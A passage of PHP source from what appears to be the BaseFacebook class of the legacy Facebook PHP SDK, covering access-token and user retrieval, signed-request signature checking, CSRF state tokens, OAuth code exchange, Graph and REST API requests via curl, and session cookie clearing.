        $access_token = $signed_request['oauth_token'];
        $this->setPersistentData('access_token', $access_token);
        return $access_token;
      }

      // the JS SDK puts a code in with the redirect_uri of ''
      if (array_key_exists('code', $signed_request)) {
        $code = $signed_request['code'];
        if ($code && $code == $this->getPersistentData('code')) {
          // short-circuit if the code we have is the same as the one presented
          return $this->getPersistentData('access_token');
        }

        $access_token = $this->getAccessTokenFromCode($code, '');
        if ($access_token) {
          $this->setPersistentData('code', $code);
          $this->setPersistentData('access_token', $access_token);
          return $access_token;
        }
      }

      // signed request states there's no access token, so anything
      // stored should be cleared.
      $this->clearAllPersistentData();
      return false; // respect the signed request's data, even
                    // if there's an authorization code or something else
    }

    $code = $this->getCode();
    if ($code && $code != $this->getPersistentData('code')) {
      $access_token = $this->getAccessTokenFromCode($code);
      if ($access_token) {
        $this->setPersistentData('code', $code);
        $this->setPersistentData('access_token', $access_token);
        return $access_token;
      }

      // code was bogus, so everything based on it should be invalidated.
      $this->clearAllPersistentData();
      return false;
    }

    // as a fallback, just return whatever is in the persistent
    // store, knowing nothing explicit (signed request, authorization
    // code, etc.) was present to shadow it (or we saw a code in $_REQUEST,
    // but it's the same as what's in the persistent store)
    return $this->getPersistentData('access_token');
  }

  /**
   * Retrieve the signed request, either from a request parameter or,
   * if not present, from a cookie.
   *
   * @return string the signed request, if available, or null otherwise.
   */
  public function getSignedRequest() {
    if (!$this->signedRequest) {
      if ($this->allowSignedRequest && !empty($_REQUEST['signed_request'])) {
        $this->signedRequest = $this->parseSignedRequest(
          $_REQUEST['signed_request']
        );
      } else if (!empty($_COOKIE[$this->getSignedRequestCookieName()])) {
        $this->signedRequest = $this->parseSignedRequest(
          $_COOKIE[$this->getSignedRequestCookieName()]);
      }
    }
    return $this->signedRequest;
  }

  /**
   * Get the UID of the connected user, or 0
   * if the Facebook user is not connected.
   *
   * @return string the UID if available.
   */
  public function getUser() {
    if ($this->user !== null) {
      // we've already determined this and cached the value.
      return $this->user;
    }

    return $this->user = $this->getUserFromAvailableData();
  }

  /**
   * Determines the connected user by first examining any signed
   * requests, then considering an authorization code, and then
   * falling back to any persistent store storing the user.
   *
   * @return integer The id of the connected Facebook user,
   *                 or 0 if no such user exists.
   */
  protected function getUserFromAvailableData() {
    // if a signed request is supplied, then it solely determines
    // who the user is.
    $signed_request = $this->getSignedRequest();
    if ($signed_request) {
      if (array_key_exists('user_id', $signed_request)) {
        $user = $signed_request['user_id'];

        if($user != $this->getPersistentData('user_id')){
          $this->clearAllPersistentData();
        }

        $this->setPersistentData('user_id', $signed_request['user_id']);
        return $user;
      }

      // if the signed request didn't present a user id, then invalidate
      // all entries in any persistent store.
      $this->clearAllPersistentData();
      return 0;
    }

    $user = $this->getPersistentData('user_id', $default = 0);
    $persisted_access_token = $this->getPersistentData('access_token');

    // use access_token to fetch user id if we have a user access_token, or if
    // the cached access token has changed.
    $access_token = $this->getAccessToken();
    if ($access_token &&
        $access_token != $this->getApplicationAccessToken() &&
        !($user && $persisted_access_token == $access_token)) {
      $user = $this->getUserFromAccessToken();
      if ($user) {
        $this->setPersistentData('user_id', $user);
      } else {
        $this->clearAllPersistentData();
      }
    }

    return $user;
  }

  /**
   * Get a Login URL for use with redirects. By default, full page redirect is
   * assumed. If you are using the generated URL with a window.open() call in
   * JavaScript, you can pass in display=popup as part of the $params.
   *
   * The parameters:
   * - redirect_uri: the url to go to after a successful login
   * - scope: comma separated list of requested extended perms
   *
   * @param array $params Provide custom parameters
   * @return string The URL for the login flow
   */
  public function getLoginUrl($params=array()) {
    $this->establishCSRFTokenState();
    $currentUrl = $this->getCurrentUrl();

    // if 'scope' is passed as an array, convert to comma separated list
    $scopeParams = isset($params['scope']) ? $params['scope'] : null;
    if ($scopeParams && is_array($scopeParams)) {
      $params['scope'] = implode(',', $scopeParams);
    }

    return $this->getUrl(
      'www',
      'dialog/oauth',
      array_merge(
        array(
          'client_id' => $this->getAppId(),
          'redirect_uri' => $currentUrl, // possibly overwritten
          'state' => $this->state,
          'sdk' => 'php-sdk-'.self::VERSION
        ),
        $params
      ));
  }

  /**
   * Get a Logout URL suitable for use with redirects.
   *
   * The parameters:
   * - next: the url to go to after a successful logout
   *
   * @param array $params Provide custom parameters
   * @return string The URL for the logout flow
   */
  public function getLogoutUrl($params=array()) {
    return $this->getUrl(
      'www',
      'logout.php',
      array_merge(array(
        'next' => $this->getCurrentUrl(),
        'access_token' => $this->getUserAccessToken(),
      ), $params)
    );
  }

  /**
   * Make an API call.
   *
   * @return mixed The decoded response
   */
  public function api(/* polymorphic */) {
    $args = func_get_args();
    if (is_array($args[0])) {
      return $this->_restserver($args[0]);
    } else {
      return call_user_func_array(array($this, '_graph'), $args);
    }
  }

  /**
   * Constructs and returns the name of the cookie that
   * potentially houses the signed request for the app user.
   * The cookie is not set by the BaseFacebook class, but
   * it may be set by the JavaScript SDK.
   *
   * @return string the name of the cookie that would house
   *         the signed request value.
   */
  protected function getSignedRequestCookieName() {
    return 'fbsr_'.$this->getAppId();
  }

  /**
   * Constructs and returns the name of the cookie that potentially contain
   * metadata. The cookie is not set by the BaseFacebook class, but it may be
   * set by the JavaScript SDK.
   *
   * @return string the name of the cookie that would house metadata.
   */
  protected function getMetadataCookieName() {
    return 'fbm_'.$this->getAppId();
  }

  /**
   * Get the authorization code from the query parameters, if it exists,
   * and otherwise return false to signal no authorization code was
   * discoverable.
   *
   * @return mixed The authorization code, or false if the authorization
   *               code could not be determined.
   */
  protected function getCode() {
    if (!isset($_REQUEST['code']) || !isset($_REQUEST['state'])) {
      return false;
    }
    if ($this->state === $_REQUEST['state']) {
        // CSRF state has done its job, so clear it
        $this->state = null;
        $this->clearPersistentData('state');
        return $_REQUEST['code'];
    }
    self::errorLog('CSRF state token does not match one provided.');

    return false;
  }

  /**
   * Retrieves the UID with the understanding that
   * $this->accessToken has already been set and is
   * seemingly legitimate.  It relies on Facebook's Graph API
   * to retrieve user information and then extract
   * the user ID.
   *
   * @return integer Returns the UID of the Facebook user, or 0
   *                 if the Facebook user could not be determined.
   */
  protected function getUserFromAccessToken() {
    try {
      $user_info = $this->api('/me');
      return $user_info['id'];
    } catch (FacebookApiException $e) {
      return 0;
    }
  }

  /**
   * Returns the access token that should be used for logged out
   * users when no authorization code is available.
   *
   * @return string The application access token, useful for gathering
   *                public information about users and applications.
   */
  public function getApplicationAccessToken() {
    return $this->appId.'|'.$this->appSecret;
  }

  /**
   * Lays down a CSRF state token for this process.
   *
   * @return void
   */
  protected function establishCSRFTokenState() {
    if ($this->state === null) {
      $this->state = md5(uniqid(mt_rand(), true));
      $this->setPersistentData('state', $this->state);
    }
  }

  /**
   * Retrieves an access token for the given authorization code
   * (previously generated from www.facebook.com on behalf of
   * a specific user).  The authorization code is sent to graph.facebook.com
   * and a legitimate access token is generated provided the access token
   * and the user for which it was generated all match, and the user is
   * either logged in to Facebook or has granted an offline access permission.
   *
   * @param string $code An authorization code.
   * @param string $redirect_uri Optional redirect URI. Default null
   *
   * @return mixed An access token exchanged for the authorization code, or
   *               false if an access token could not be generated.
   */
  protected function getAccessTokenFromCode($code, $redirect_uri = null) {
    if (empty($code)) {
      return false;
    }

    if ($redirect_uri === null) {
      $redirect_uri = $this->getCurrentUrl();
    }

    try {
      // need to circumvent json_decode by calling _oauthRequest
      // directly, since response isn't JSON format.
      $access_token_response =
        $this->_oauthRequest(
          $this->getUrl('graph', '/oauth/access_token'),
          $params = array('client_id' => $this->getAppId(),
                          'client_secret' => $this->getAppSecret(),
                          'redirect_uri' => $redirect_uri,
                          'code' => $code));
    } catch (FacebookApiException $e) {
      // most likely that user very recently revoked authorization.
      // In any event, we don't have an access token, so say so.
      return false;
    }

    if (empty($access_token_response)) {
      return false;
    }

    $response_params = array();
    parse_str($access_token_response, $response_params);
    if (!isset($response_params['access_token'])) {
      return false;
    }

    return $response_params['access_token'];
  }

  /**
   * Invoke the old restserver.php endpoint.
   *
   * @param array $params Method call object
   *
   * @return mixed The decoded response object
   * @throws FacebookApiException
   */
  protected function _restserver($params) {
    // generic application level parameters
    $params['api_key'] = $this->getAppId();
    $params['format'] = 'json-strings';

    $result = json_decode($this->_oauthRequest(
      $this->getApiUrl($params['method']),
      $params
    ), true);

    // results are returned, errors are thrown
    if (is_array($result) && isset($result['error_code'])) {
      $this->throwAPIException($result);
      // @codeCoverageIgnoreStart
    }
    // @codeCoverageIgnoreEnd

    $method = strtolower($params['method']);
    if ($method === 'auth.expiresession' ||
        $method === 'auth.revokeauthorization') {
      $this->destroySession();
    }

    return $result;
  }

  /**
   * Return true if this is video post.
   *
   * @param string $path The path
   * @param string $method The http method (default 'GET')
   *
   * @return boolean true if this is video post
   */
  protected function isVideoPost($path, $method = 'GET') {
    if ($method == 'POST' && preg_match("/^(\/)(.+)(\/)(videos)$/", $path)) {
      return true;
    }
    return false;
  }

  /**
   * Invoke the Graph API.
   *
   * @param string $path The path (required)
   * @param string $method The http method (default 'GET')
   * @param array $params The query/post data
   *
   * @return mixed The decoded response object
   * @throws FacebookApiException
   */
  protected function _graph($path, $method = 'GET', $params = array()) {
    if (is_array($method) && empty($params)) {
      $params = $method;
      $method = 'GET';
    }
    $params['method'] = $method; // method override as we always do a POST

    if ($this->isVideoPost($path, $method)) {
      $domainKey = 'graph_video';
    } else {
      $domainKey = 'graph';
    }

    $result = json_decode($this->_oauthRequest(
      $this->getUrl($domainKey, $path),
      $params
    ), true);

    // results are returned, errors are thrown
    if (is_array($result) && isset($result['error'])) {
      $this->throwAPIException($result);
      // @codeCoverageIgnoreStart
    }
    // @codeCoverageIgnoreEnd

    return $result;
  }

  /**
   * Make a OAuth Request.
   *
   * @param string $url The path (required)
   * @param array $params The query/post data
   *
   * @return string The decoded response object
   * @throws FacebookApiException
   */
  protected function _oauthRequest($url, $params) {
    if (!isset($params['access_token'])) {
      $params['access_token'] = $this->getAccessToken();
    }

    if (isset($params['access_token']) && !isset($params['appsecret_proof'])) {
      $params['appsecret_proof'] = $this->getAppSecretProof($params['access_token']);
    }

    // json_encode all params values that are not strings
    foreach ($params as $key => $value) {
      if (!is_string($value) && !($value instanceof CURLFile)) {
        $params[$key] = json_encode($value);
      }
    }

    return $this->makeRequest($url, $params);
  }

  /**
   * Generate a proof of App Secret
   * This is required for all API calls originating from a server
   * It is a sha256 hash of the access_token made using the app secret
   *
   * @param string $access_token The access_token to be hashed (required)
   *
   * @return string The sha256 hash of the access_token
   */
  protected function getAppSecretProof($access_token) {
    return hash_hmac('sha256', $access_token, $this->getAppSecret());
  }

  /**
   * Makes an HTTP request. This method can be overridden by subclasses if
   * developers want to do fancier things or use something other than curl to
   * make the request.
   *
   * @param string $url The URL to make the request to
   * @param array $params The parameters to use for the POST body
   * @param CurlHandler $ch Initialized curl handle
   *
   * @return string The response text
   */
  protected function makeRequest($url, $params, $ch=null) {
    if (!$ch) {
      $ch = curl_init();
    }

    $opts = self::$CURL_OPTS;
    if ($this->getFileUploadSupport()) {
      $opts[CURLOPT_POSTFIELDS] = $params;
    } else {
      $opts[CURLOPT_POSTFIELDS] = http_build_query($params, null, '&');
    }
    $opts[CURLOPT_URL] = $url;

    // disable the 'Expect: 100-continue' behaviour. This causes CURL to wait
    // for 2 seconds if the server does not support this header.
    if (isset($opts[CURLOPT_HTTPHEADER])) {
      $existing_headers = $opts[CURLOPT_HTTPHEADER];
      $existing_headers[] = 'Expect:';
      $opts[CURLOPT_HTTPHEADER] = $existing_headers;
    } else {
      $opts[CURLOPT_HTTPHEADER] = array('Expect:');
    }

    curl_setopt_array($ch, $opts);
    $result = curl_exec($ch);

    $errno = curl_errno($ch);
    // CURLE_SSL_CACERT || CURLE_SSL_CACERT_BADFILE
    if ($errno == 60 || $errno == 77) {
      self::errorLog('Invalid or no certificate authority found, '.
                     'using bundled information');
      curl_setopt($ch, CURLOPT_CAINFO,
                  dirname(__FILE__) . DIRECTORY_SEPARATOR . 'fb_ca_chain_bundle.crt');
      $result = curl_exec($ch);
    }

    // With dual stacked DNS responses, it's possible for a server to
    // have IPv6 enabled but not have IPv6 connectivity.  If this is
    // the case, curl will try IPv4 first and if that fails, then it will
    // fall back to IPv6 and the error EHOSTUNREACH is returned by the
    // operating system.
    if ($result === false && empty($opts[CURLOPT_IPRESOLVE])) {
        $matches = array();
        $regex = '/Failed to connect to ([^:].*): Network is unreachable/';
        if (preg_match($regex, curl_error($ch), $matches)) {
          if (strlen(@inet_pton($matches[1])) === 16) {
            self::errorLog('Invalid IPv6 configuration on server, '.
                           'Please disable or get native IPv6 on your server.');
            self::$CURL_OPTS[CURLOPT_IPRESOLVE] = CURL_IPRESOLVE_V4;
            curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
            $result = curl_exec($ch);
          }
        }
    }

    if ($result === false) {
      $e = new FacebookApiException(array(
        'error_code' => curl_errno($ch),
        'error' => array(
        'message' => curl_error($ch),
        'type' => 'CurlException',
        ),
      ));
      curl_close($ch);
      throw $e;
    }
    curl_close($ch);
    return $result;
  }

  /**
   * Parses a signed_request and validates the signature.
   *
   * @param string $signed_request A signed token
   *
   * @return array The payload inside it or null if the sig is wrong
   */
  protected function parseSignedRequest($signed_request) {

    if (!$signed_request || strpos($signed_request, '.') === false) {
        self::errorLog('Signed request was invalid!');
        return null;
    }

    list($encoded_sig, $payload) = explode('.', $signed_request, 2);

    // decode the data
    $sig = self::base64UrlDecode($encoded_sig);
    $data = json_decode(self::base64UrlDecode($payload), true);

    if (!isset($data['algorithm'])
        || strtoupper($data['algorithm']) !==  self::SIGNED_REQUEST_ALGORITHM
    ) {
      self::errorLog(
        'Unknown algorithm. Expected ' . self::SIGNED_REQUEST_ALGORITHM);
      return null;
    }

    // check sig
    $expected_sig = hash_hmac('sha256', $payload,
                              $this->getAppSecret(), $raw = true);

    if (strlen($expected_sig) !== strlen($sig)) {
      self::errorLog('Bad Signed JSON signature!');
      return null;
    }

    $result = 0;
    for ($i = 0; $i < strlen($expected_sig); $i++) {
      $result |= ord($expected_sig[$i]) ^ ord($sig[$i]);
    }

    if ($result == 0) {
      return $data;
    } else {
      self::errorLog('Bad Signed JSON signature!');
      return null;
    }
  }

  /**
   * Makes a signed_request blob using the given data.
   *
   * @param array $data The data array.
   *
   * @return string The signed request.
   */
  protected function makeSignedRequest($data) {
    if (!is_array($data)) {
      throw new InvalidArgumentException(
        'makeSignedRequest expects an array. Got: ' . print_r($data, true));
    }
    $data['algorithm'] = self::SIGNED_REQUEST_ALGORITHM;
    $data['issued_at'] = time();
    $json = json_encode($data);
    $b64 = self::base64UrlEncode($json);
    $raw_sig = hash_hmac('sha256', $b64, $this->getAppSecret(), $raw = true);
    $sig = self::base64UrlEncode($raw_sig);
    return $sig.'.'.$b64;
  }

  /**
   * Build the URL for api given parameters.
   *
   * @param string $method The method name.
   *
   * @return string The URL for the given parameters
   */
  protected function getApiUrl($method) {
    static $READ_ONLY_CALLS =
      array('admin.getallocation' => 1,
            'admin.getappproperties' => 1,
            'admin.getbannedusers' => 1,
            'admin.getlivestreamvialink' => 1,
            'admin.getmetrics' => 1,
            'admin.getrestrictioninfo' => 1,
            'application.getpublicinfo' => 1,
            'auth.getapppublickey' => 1,
            'auth.getsession' => 1,
            'auth.getsignedpublicsessiondata' => 1,
            'comments.get' => 1,
            'connect.getunconnectedfriendscount' => 1,
            'dashboard.getactivity' => 1,
            'dashboard.getcount' => 1,
            'dashboard.getglobalnews' => 1,
            'dashboard.getnews' => 1,
            'dashboard.multigetcount' => 1,
            'dashboard.multigetnews' => 1,
            'data.getcookies' => 1,
            'events.get' => 1,
            'events.getmembers' => 1,
            'fbml.getcustomtags' => 1,
            'feed.getappfriendstories' => 1,
            'feed.getregisteredtemplatebundlebyid' => 1,
            'feed.getregisteredtemplatebundles' => 1,
            'fql.multiquery' => 1,
            'fql.query' => 1,
            'friends.arefriends' => 1,
            'friends.get' => 1,
            'friends.getappusers' => 1,
            'friends.getlists' => 1,
            'friends.getmutualfriends' => 1,
            'gifts.get' => 1,
            'groups.get' => 1,
            'groups.getmembers' => 1,
            'intl.gettranslations' => 1,
            'links.get' => 1,
            'notes.get' => 1,
            'notifications.get' => 1,
            'pages.getinfo' => 1,
            'pages.isadmin' => 1,
            'pages.isappadded' => 1,
            'pages.isfan' => 1,
            'permissions.checkavailableapiaccess' => 1,
            'permissions.checkgrantedapiaccess' => 1,
            'photos.get' => 1,
            'photos.getalbums' => 1,
            'photos.gettags' => 1,
            'profile.getinfo' => 1,
            'profile.getinfooptions' => 1,
            'stream.get' => 1,
            'stream.getcomments' => 1,
            'stream.getfilters' => 1,
            'users.getinfo' => 1,
            'users.getloggedinuser' => 1,
            'users.getstandardinfo' => 1,
            'users.hasapppermission' => 1,
            'users.isappuser' => 1,
            'users.isverified' => 1,
            'video.getuploadlimits' => 1);
    $name = 'api';
    if (isset($READ_ONLY_CALLS[strtolower($method)])) {
      $name = 'api_read';
    } else if (strtolower($method) == 'video.upload') {
      $name = 'api_video';
    }
    return self::getUrl($name, 'restserver.php');
  }

  /**
   * Build the URL for given domain alias, path and parameters.
   *
   * @param string $name   The name of the domain
   * @param string $path   Optional path (without a leading slash)
   * @param array  $params Optional query parameters
   *
   * @return string The URL for the given parameters
   */
  protected function getUrl($name, $path='', $params=array()) {
    $url = self::$DOMAIN_MAP[$name];
    if ($path) {
      if ($path[0] === '/') {
        $path = substr($path, 1);
      }
      $url .= $path;
    }
    if ($params) {
      $url .= '?' . http_build_query($params, null, '&');
    }

    return $url;
  }

  /**
   * Returns the HTTP Host
   *
   * @return string The HTTP Host
   */
  protected function getHttpHost() {
    if ($this->trustForwarded && isset($_SERVER['HTTP_X_FORWARDED_HOST'])) {
      $forwardProxies = explode(',', $_SERVER['HTTP_X_FORWARDED_HOST']);
      if (!empty($forwardProxies)) {
        return $forwardProxies[0];
      }
    }
    return $_SERVER['HTTP_HOST'];
  }

  /**
   * Returns the HTTP Protocol
   *
   * @return string The HTTP Protocol
   */
  protected function getHttpProtocol() {
    if ($this->trustForwarded && isset($_SERVER['HTTP_X_FORWARDED_PROTO'])) {
      if ($_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
        return 'https';
      }
      return 'http';
    }
    /*apache + variants specific way of checking for https*/
    if (isset($_SERVER['HTTPS']) &&
        ($_SERVER['HTTPS'] === 'on' || $_SERVER['HTTPS'] == 1)) {
      return 'https';
    }
    /*nginx way of checking for https*/
    if (isset($_SERVER['SERVER_PORT']) &&
        ($_SERVER['SERVER_PORT'] === '443')) {
      return 'https';
    }
    return 'http';
  }

  /**
   * Returns the base domain used for the cookie.
   *
   * @return string The base domain
   */
  protected function getBaseDomain() {
    // The base domain is stored in the metadata cookie if not we fallback
    // to the current hostname
    $metadata = $this->getMetadataCookie();
    if (array_key_exists('base_domain', $metadata) &&
        !empty($metadata['base_domain'])) {
      return trim($metadata['base_domain'], '.');
    }
    return $this->getHttpHost();
  }

  /**
   * Returns the Current URL, stripping it of known FB parameters that should
   * not persist.
   *
   * @return string The current URL
   */
  protected function getCurrentUrl() {
    $protocol = $this->getHttpProtocol() . '://';
    $host = $this->getHttpHost();
    $currentUrl = $protocol.$host.$_SERVER['REQUEST_URI'];
    $parts = parse_url($currentUrl);

    $query = '';
    if (!empty($parts['query'])) {
      // drop known fb params
      $params = explode('&', $parts['query']);
      $retained_params = array();
      foreach ($params as $param) {
        if ($this->shouldRetainParam($param)) {
          $retained_params[] = $param;
        }
      }

      if (!empty($retained_params)) {
        $query = '?'.implode($retained_params, '&');
      }
    }

    // use port if non default
    $port =
      isset($parts['port']) &&
      (($protocol === 'http://' && $parts['port'] !== 80) ||
       ($protocol === 'https://' && $parts['port'] !== 443))
      ? ':' . $parts['port'] : '';

    // rebuild
    return $protocol . $parts['host'] . $port . $parts['path'] . $query;
  }

  /**
   * Returns true if and only if the key or key/value pair should
   * be retained as part of the query string.  This amounts to
   * a brute-force search of the very small list of Facebook-specific
   * params that should be stripped out.
   *
   * @param string $param A key or key/value pair within a URL's query (e.g.
   *                      'foo=a', 'foo=', or 'foo'.
   *
   * @return boolean
   */
  protected function shouldRetainParam($param) {
    foreach (self::$DROP_QUERY_PARAMS as $drop_query_param) {
      if ($param === $drop_query_param ||
          strpos($param, $drop_query_param.'=') === 0) {
        return false;
      }
    }

    return true;
  }

  /**
   * Analyzes the supplied result to see if it was thrown
   * because the access token is no longer valid.  If that is
   * the case, then we destroy the session.
   *
   * @param array $result A record storing the error message returned
   *                      by a failed API call.
   */
  protected function throwAPIException($result) {
    $e = new FacebookApiException($result);
    switch ($e->getType()) {
      // OAuth 2.0 Draft 00 style
      case 'OAuthException':
        // OAuth 2.0 Draft 10 style
      case 'invalid_token':
        // REST server errors are just Exceptions
      case 'Exception':
        $message = $e->getMessage();
        if ((strpos($message, 'Error validating access token') !== false) ||
            (strpos($message, 'Invalid OAuth access token') !== false) ||
            (strpos($message, 'An active access token must be used') !== false)
        ) {
          $this->destroySession();
        }
        break;
    }

    throw $e;
  }


  /**
   * Prints to the error log if you aren't in command line mode.
   *
   * @param string $msg Log message
   */
  protected static function errorLog($msg) {
    // disable error log if we are running in a CLI environment
    // @codeCoverageIgnoreStart
    if (php_sapi_name() != 'cli') {
      error_log($msg);
    }
    // uncomment this if you want to see the errors on the page
    // print 'error_log: '.$msg."\n";
    // @codeCoverageIgnoreEnd
  }

  /**
   * Base64 encoding that doesn't need to be urlencode()ed.
   * Exactly the same as base64_encode except it uses
   *   - instead of +
   *   _ instead of /
   *   No padded =
   *
   * @param string $input base64UrlEncoded input
   *
   * @return string The decoded string
   */
  protected static function base64UrlDecode($input) {
    return base64_decode(strtr($input, '-_', '+/'));
  }

  /**
   * Base64 encoding that doesn't need to be urlencode()ed.
   * Exactly the same as base64_encode except it uses
   *   - instead of +
   *   _ instead of /
   *
   * @param string $input The input to encode
   * @return string The base64Url encoded input, as a string.
   */
  protected static function base64UrlEncode($input) {
    $str = strtr(base64_encode($input), '+/', '-_');
    $str = str_replace('=', '', $str);
    return $str;
  }

  /**
   * Destroy the current session
   */
  public function destroySession() {
    $this->accessToken = null;
    $this->signedRequest = null;
    $this->user = null;
    $this->clearAllPersistentData();

    // Javascript sets a cookie that will be used in getSignedRequest that we
    // need to clear if we can
    $cookie_name = $this->getSignedRequestCookieName();
    if (array_key_exists($cookie_name, $_COOKIE)) {
      unset($_COOKIE[$cookie_name]);
      if (!headers_sent()) {
        $base_domain = $this->getBaseDomain();
        setcookie($cookie_name, '', 1, '/', '.'.$base_domain);
      } else {
        // @codeCoverageIgnoreStart
        self::errorLog(
          'There exists a cookie that we wanted to clear that we couldn\'t '.
          'clear because headers was already sent. Make sure to do the first '.
          'API call before outputing anything.'
        );
        // @codeCoverageIgnoreEnd
      }
    }
  }

  /**
   * Parses the metadata cookie that our Javascript API set
   *
   * @return array an array mapping key to value
   */
  protected function getMetadataCookie() {
    $cookie_name = $this->getMetadataCookieName();
    if (!array_key_exists($cookie_name, $_COOKIE)) {
      return array();
    }

    // The cookie value can be wrapped in "-characters so remove them
    $cookie_value = trim($_COOKIE[$cookie_name], '"');

    if (empty($cookie_value)) {
      return array();
    }

    $parts = explode('&', $cookie_value);
    $metadata = array();
    foreach ($parts as $part) {
      $pair = explode('=', $part, 2);
      if (!empty($pair[0])) {
        $metadata[urldecode($pair[0])] =
          (count($pair) > 1) ? urldecode($pair[1]) : '';
      }
    }

    return $metadata;
  }

  /**
   * Finds whether the given domain is allowed or not
   *
   * @param string $big   The value to be checked against $small
   * @param string $small The input string
   *
   * @return boolean Returns TRUE if $big matches $small
   */
  protected static function isAllowedDomain($big, $small) {
    if ($big === $small) {
      return true;
    }
    return self::endsWith($big, '.'.$small);
  }

  /**
   * Checks if $big string ends with $small string
   *
   * @param string $big   The value to be checked against $small
   * @param string $small The input string
   *
   * @return boolean TRUE if $big ends with $small
   */
  protected static function endsWith($big, $small) {
    $len = strlen($small);
    if ($len === 0) {
      return true;
    }
    return substr($big, -$len) === $small;
  }

  /**
   * Each of the following four methods should be overridden in
   * a concrete subclass, as they are in the provided Facebook class.
   * The Facebook class uses PHP sessions to provide a primitive
   * persistent store, but another subclass--one that you implement--
   * might use a database, memcache, or an in-memory cache.
   *
   * @see Facebook
   */

  /**
   * Stores the given ($key, $value) pair, so that future calls to
   * getPersistentData($key) return $value. This call may be in another request.
   *
   * @param string $key
   * @param array $value
   *
   * @return void
   */
  abstract protected function setPersistentData($key, $value);

  /**
   * Get the data for $key, persisted by BaseFacebook::setPersistentData()
   *
   * @param string $key The key of the data to retrieve
   * @param boolean $default The default value to return if $key is not found
   *
   * @return mixed
   */
  abstract protected function getPersistentData($key, $default = false);

  /**
   * Clear the data with $key from the persistent storage
   *
   * @param string $key
   *
   * @return void
   */
  abstract protected function clearPersistentData($key);

  /**
   * Clear all data from the persistent storage
   *
   * @return void
   */
  abstract protected function clearAllPersistentData();
}
